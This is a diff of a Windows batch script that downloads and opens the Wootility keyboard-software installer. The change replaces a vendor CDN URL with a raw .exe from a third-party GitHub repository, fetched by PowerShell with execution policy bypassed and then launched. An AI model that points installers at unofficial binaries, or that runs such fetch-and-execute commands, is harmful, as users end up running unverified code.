@@ -12,7 +12,7 @@ echo    This script will automatically
 echo    download Wootiliy and run it.
 echo =====================================
 pause
-PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://wootility-updates.ams3.cdn.digitaloceanspaces.com/wootility-win/Wootility%20Setup%205.0.6.exe' -OutFile 'C:\Temp\Wootility Setup 5.0.6.exe'"
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/LettuceManOfficial/LettuceMan-Tools/raw/refs/heads/main/Keyboards/Wooting/Wootility_Setup.exe' -OutFile 'C:\Temp\Wootility_Setup.exe'"
 cls
 echo Opening Wootility Setup...
 echo Please follow the on-screen instructions to install Wootility.
